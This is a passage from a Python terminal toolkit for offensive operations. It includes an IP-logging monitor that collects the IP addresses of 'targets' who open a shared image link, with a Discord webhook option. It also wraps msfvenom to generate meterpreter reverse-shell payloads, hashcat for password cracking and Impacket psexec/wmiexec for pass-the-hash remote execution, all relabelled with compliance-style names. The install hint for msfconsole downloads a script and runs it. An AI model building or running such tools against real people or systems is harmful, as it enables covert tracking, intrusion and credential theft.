            print(f"{Colors.RED}[!] Deployment error: {e}{Colors.RESET}")
        
        input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")

def _format_timestamp(ts):
    if not ts or ts == 'N/A':
        return f"{Fore.YELLOW}N/A{Fore.RESET}"
    try:
        if 'T' in ts:
            dt = datetime.strptime(ts.split('.')[0].replace('T', ' '), '%Y-%m-%d %H:%M:%S')
            return f"{Fore.WHITE}{dt.strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}"
        return f"{Fore.WHITE}{ts[:19]}{Fore.RESET}"
    except Exception:
        return f"{Fore.WHITE}{ts[:19]}{Fore.RESET}"


def monitor_vercel_logs(public_url, image_url, logs_url, webhook_enabled=False, webhook_url=None):
    
    excluded_ips = set()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        if local_ip and local_ip != '127.0.0.1':
            excluded_ips.add(local_ip)
    except Exception:
        pass
    
    try:
        config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'core', 'input', 'excluded_ips.txt')
        if os.path.exists(config_path):
            with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    ip = line.strip()
                    if ip and not ip.startswith('#'):
                        excluded_ips.add(ip)
    except Exception:
        pass
    
    seen_ips = set()
    header_printed = False
    last_count = 0
    waiting_printed = False
    
    try:
        while True:
            try:
                import urllib.request
                req = urllib.request.Request(logs_url, headers={
                    'User-Agent': 'Mainframe-Logs-Viewer',
                    'Accept-Encoding': 'identity'
                })
                with urllib.request.urlopen(req, timeout=5) as resp:
                    raw = resp.read()
                    try:
                        logs = json.loads(raw.decode('utf-8'))
                    except (UnicodeDecodeError, json.JSONDecodeError):
                        logs = []
                
                new_count = len(logs)
                
                if not header_printed:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f"\n{Back.GREEN}{Fore.BLACK}{Style.BRIGHT} MONITORING VERCEl LOGS {Back.RESET}{Fore.RESET}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}Share this URL with target:{Fore.RESET}")
                    print(f"{Fore.YELLOW}{image_url}{Fore.RESET}")
                    print(f"{Fore.CYAN}Logs endpoint:{Fore.RESET} {Fore.BLUE}{logs_url}{Fore.RESET}")
                    if webhook_enabled and webhook_url:
                        print(f"{Fore.MAGENTA}Discord webhook: {Fore.GREEN}Enabled{Fore.RESET}")
                    else:
                        print(f"{Fore.MAGENTA}Discord webhook: {Fore.RED}Disabled{Fore.RESET}")
                    print(f"{Fore.GREEN}Press Ctrl+C to stop...{Fore.RESET}\n")
                    header_printed = True
                
                new_logs = []
                for log in logs:
                    ip = log.get('ip', 'unknown')
                    if ip in excluded_ips:
                        continue
                    if ip not in seen_ips:
                        seen_ips.add(ip)
                        new_logs.append(log)
                
                if new_logs:
                    print(f"\n{Fore.MAGENTA}{'='*90}{Fore.RESET}")
                    print(f"{Style.BRIGHT}{Fore.WHITE}{'#':<4} {'IP ADDRESS':<18} {'VPN':<12} {'BOT':<6} {'TIMESTAMP':<22}{Fore.RESET}{Style.RESET_ALL}")
                    print(f"{Fore.MAGENTA}{'='*90}{Fore.RESET}")
                    
                    for idx, log in enumerate(new_logs, 1):
                        ip = log.get('ip', 'unknown')
                        vpn = log.get('vpn', 'No')
                        bot = log.get('bot', 'No')
                        ts = log.get('timestamp', 'N/A')
                        print(f"{Fore.WHITE}{idx:<4} {Fore.CYAN}{ip:<18} {Fore.YELLOW}{vpn:<12} {Fore.RED if bot == 'Yes' else Fore.GREEN}{bot:<6} {Fore.WHITE}{ts:<22}{Fore.RESET}")
                    
                    print(f"{Fore.MAGENTA}{'='*90}{Fore.RESET}")
                    print(f"{Fore.YELLOW}New captures: {len(new_logs)} | Total tracked: {len(seen_ips)} | Total server logs: {new_count}{Fore.RESET}\n")
                elif new_count == 0 and not waiting_printed:
                    print(f"{Fore.YELLOW}[*] Waiting for captures... (share {image_url}){Fore.RESET}")
                    waiting_printed = True
                elif new_logs and waiting_printed:
                    waiting_printed = False
                    
            except Exception as e:
                print(f"{Fore.RED}[!] Monitor error: {e}{Fore.RESET}")
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        pass

def run_msfconsole():

    if ui is not None: ui.panel("LAUNCHING INLINE — Type 'exit' or press Ctrl+C to return to menu.",
                                  title="METASPLOIT FRAMEWORK CONSOLE", border_style="green")
    else:
        print(f"\n{Colors.GREEN}[METASPLOIT FRAMEWORK CONSOLE INTERFACE]{Colors.RESET}")
    executable_path = find_global_command('msfconsole')
    if not executable_path or not os.path.exists(executable_path):
        print(f"{Colors.RED}[!] Binary Not Found: msfconsole is not installed or not in system PATH.{Colors.RESET}")
        print(f"{Colors.AMBER}    Install via: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/boot.rb > boot.rb && ruby boot.rb{Colors.RESET}")
        input(f"\nPress Enter to return...")
        return
    
    print(f"{Colors.GREEN}Resolved msfconsole path: {executable_path}{Colors.RESET}")
    print(f"{Colors.AMBER}Launching inline. Type 'exit' or press Ctrl+C to return to menu.{Colors.RESET}\n")
    print("-" * 75)
    try:
        subprocess.run([executable_path, '-q'], capture_output=False, text=True)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"{Colors.RED}[!] Execution failed: {e}{Colors.RESET}")
    print("-" * 75)
    input(f"\nSession terminated. Press Enter to return...")

def run_msfvenom():

    if ui is not None: ui.section("MSFVENOM NETWORK EGRESS VERIFICATION TOOL", "green", subtitle="Generates synthetic payloads to test IDS/firewall boundary defense configurations.")
    else: print(f"\n{Colors.GREEN}[MSFVENOM NETWORK EGRESS VERIFICATION TOOL]{Colors.RESET}")
    executable_path = find_global_command('msfvenom')
    if not executable_path or not os.path.exists(executable_path):
        print(f"{Colors.RED}[!] Binary Not Found: msfvenom is not installed or not in system PATH.{Colors.RESET}")
        input(f"\nPress Enter to return...")
        return
    
    print(f"{Colors.GREEN}Resolved msfvenom path: {executable_path}{Colors.RESET}\n")
    
    lhost = input("Enter LHOST (listener IP, e.g., 127.0.0.1): ").strip()
    if not lhost:
        print(f"{Colors.RED}[!] LHOST is required.{Colors.RESET}")
        return
    
    lport = input("Enter LPORT (listener port, e.g., 4444): ").strip()
    if not lport:
        print(f"{Colors.RED}[!] LPORT is required.{Colors.RESET}")
        return
    
    print("\nSelect payload format:")
    print("  [1] Python (py)")
    print("  [2] PHP (php)")
    print("  [3] EXE (exe)")
    print("  [4] ELF (elf)")
    print("  [5] ASP (asp)")
    print("  [6] WAR (war)")
    fmt_choice = input("Enter format choice (1-6) [Default: 1]: ").strip() or "1"
    fmt_map = {"1": "py", "2": "php", "3": "exe", "4": "elf", "5": "asp", "6": "war"}
    fmt = fmt_map.get(fmt_choice, "py")
    
    output_file = input(f"Enter output file path [Default: payload.{fmt}]: ").strip()
    if not output_file:
        output_file = f"payload.{fmt}"
    
    payload = input("Enter msfvenom payload [Default: windows/meterpreter/reverse_tcp]: ").strip() or "windows/meterpreter/reverse_tcp"
    
    print(f"\n{Colors.AMBER}Constructing msfvenom command...{Colors.RESET}")
    cmd = [
        executable_path,
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", fmt,
        "-o", output_file
    ]
    
    print(f"{Colors.CYAN}Command: {' '.join(cmd)}{Colors.RESET}")
    confirm = input("\nExecute payload generation? (Y/N): ").strip().upper()
    if confirm != 'Y':
        print(f"{Colors.AMBER}Aborted by operator.{Colors.RESET}")
        return
    
    print(f"\n{Colors.GREEN}Generating payload...{Colors.RESET}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, errors='ignore')
        print(result.stdout)
        if result.stderr:
            print(f"{Colors.RED}{result.stderr}{Colors.RESET}")
        if os.path.exists(output_file):
            print(f"{Colors.GREEN}[+] Payload written to: {output_file}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[!] Payload generation may have failed. Output file not found.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Execution error: {e}{Colors.RESET}")
    
    input(f"\nPress Enter to return...")

def run_hashcat():

    if ui is not None: ui.section("HASHCAT PASSWORD-STRENGTH COMPLIANCE AUDITOR", "green", subtitle="Cross-references enterprise hashes against dictionary lists for credential compliance validation.")
    else: print(f"\n{Colors.GREEN}[HASHCAT PASSWORD-STRENGTH COMPLIANCE AUDITOR]{Colors.RESET}")
    executable_path = find_global_command('hashcat')
    if not executable_path or not os.path.exists(executable_path):
        print(f"{Colors.RED}[!] Binary Not Found: hashcat is not installed or not in system PATH.{Colors.RESET}")
        input(f"\nPress Enter to return...")
        return
    
    print(f"{Colors.GREEN}Resolved hashcat path: {executable_path}{Colors.RESET}\n")
    
    hash_file = input("Enter target hash file path: ").strip()
    if not hash_file or not os.path.exists(hash_file):
        print(f"{Colors.RED}[!] Hash file not found or not specified.{Colors.RESET}")
        input(f"\nPress Enter to return...")
        return
    
    wordlist = input("Enter wordlist file path: ").strip()
    if not wordlist or not os.path.exists(wordlist):
        print(f"{Colors.RED}[!] Wordlist file not found or not specified.{Colors.RESET}")
        input(f"\nPress Enter to return...")
        return
    
    hash_mode = input("Enter hashcat mode (hash type) [Default: 0 (MD5)]: ").strip() or "0"
    
    print(f"\n{Colors.AMBER}Constructing hashcat command...{Colors.RESET}")
    cmd = [
        executable_path,
        "-m", hash_mode,
        "-a", "0",
        hash_file,
        wordlist
    ]
    
    print(f"{Colors.CYAN}Command: {' '.join(cmd)}{Colors.RESET}")
    confirm = input("\nExecute compliance audit? (Y/N): ").strip().upper()
    if confirm != 'Y':
        print(f"{Colors.AMBER}Aborted by operator.{Colors.RESET}")
        return
    
    print(f"\n{Colors.GREEN}Launching hashcat inline...{Colors.RESET}")
    try:
        subprocess.run(cmd, capture_output=False, text=True)
    except KeyboardInterrupt:
        print(f"\n{Colors.AMBER}[!] Audit interrupted by operator.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Execution error: {e}{Colors.RESET}")
    
    input(f"\nPress Enter to return...")

def run_impacket():

    print(f"\n{Colors.GREEN}[IMPACKET ADMINISTRATIVE REMOTING SUITE]{Colors.RESET}")
    print("Select Impacket utility:")
    print("  [1] psexec.py")
    print("  [2] wmiexec.py")
    tool_choice = input("Enter choice (1/2): ").strip()
    
    script_name = "psexec.py" if tool_choice == "1" else "wmiexec.py" if tool_choice == "2" else None
    if not script_name:
        print(f"{Colors.RED}[!] Invalid selection.{Colors.RESET}")
        input(f"\nPress Enter to return...")
        return
    
    executable_path = find_global_command(script_name)
    if not executable_path:
        possible_paths = [
            os.path.join(os.path.dirname(sys.executable), script_name),
            os.path.join(os.path.dirname(sys.executable), 'Scripts', script_name),
            os.path.join(os.path.expanduser('~'), '.local', 'bin', script_name),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'pipx', 'shared', 'bin', script_name),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), 'core', 'impacket_scripts', script_name),
        ]
        for p in possible_paths:
            if os.path.exists(p):
                executable_path = p
                break
    
    if not executable_path or not os.path.exists(executable_path):
        print(f"{Colors.RED}[!] Script Not Found: {script_name} is not installed or not accessible.{Colors.RESET}")
        print(f"{Colors.AMBER}    Install Impacket via: pip install impacket{Colors.RESET}")
        input(f"\nPress Enter to return...")
        return
    
    print(f"{Colors.GREEN}Resolved {script_name} path: {executable_path}{Colors.RESET}\n")
    
    target = input("Enter target host (IP/hostname): ").strip()
    if not target:
        print(f"{Colors.RED}[!] Target host is required.{Colors.RESET}")
        return
    
    username = input("Enter username [Default: administrator]: ").strip() or "administrator"
    password = input("Enter password (or LM:NTLM hash): ").strip()
    if not password:
        print(f"{Colors.RED}[!] Password or hash is required.{Colors.RESET}")
        return
    
    domain = input("Enter domain [Leave blank for local]: ").strip()
    
    if executable_path.endswith('.py'):
        cmd = [sys.executable, executable_path]
    else:
        cmd = [executable_path]
    
    cmd.extend([target, username, password])
    if domain:
        cmd.extend(["-d", domain])
    
    print(f"\n{Colors.CYAN}Command: {' '.join(cmd)}{Colors.RESET}")
    confirm = input("\nExecute remoting audit? (Y/N): ").strip().upper()
    if confirm != 'Y':
        print(f"{Colors.AMBER}Aborted by operator.{Colors.RESET}")
        return
    
    print(f"\n{Colors.GREEN}Launching {script_name} inline...{Colors.RESET}")
    try:
        subprocess.run(cmd, capture_output=False, text=True)
    except KeyboardInterrupt:
        print(f"\n{Colors.AMBER}[!] Session interrupted by operator.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Execution error: {e}{Colors.RESET}")
    
    input(f"\nPress Enter to return...")

def run_log_diagnostic():

    print(f"\n{Colors.GREEN}[REAL-TIME SECURITY LOG DIAGNOSTIC MODULE]{Colors.RESET}")
    log_path = input("Enter log file path to stream: ").strip()
    if not log_path or not os.path.exists(log_path):
        print(f"{Colors.RED}[!] Log file not found or not specified.{Colors.RESET}")
        input(f"\nPress Enter to return...")
        return
    
    print(f"{Colors.GREEN}Streaming log: {log_path}{Colors.RESET}")
    print(f"{Colors.AMBER}Press Ctrl+C to stop streaming.{Colors.RESET}\n")
    print("-" * 75)
    
    try:
        with open(log_path, 'r', encoding='utf-8', errors='ignore') as f:
            f.seek(0, 2)
            while True:
                line = f.readline()
                if line:
                    print(line, end='')
                else:
                    time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n\n{Colors.AMBER}[!] Stream stopped by operator.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Stream error: {e}{Colors.RESET}")
    
    print("-" * 75)
    input(f"\nPress Enter to return...")

if __name__ == "__main__":
    main()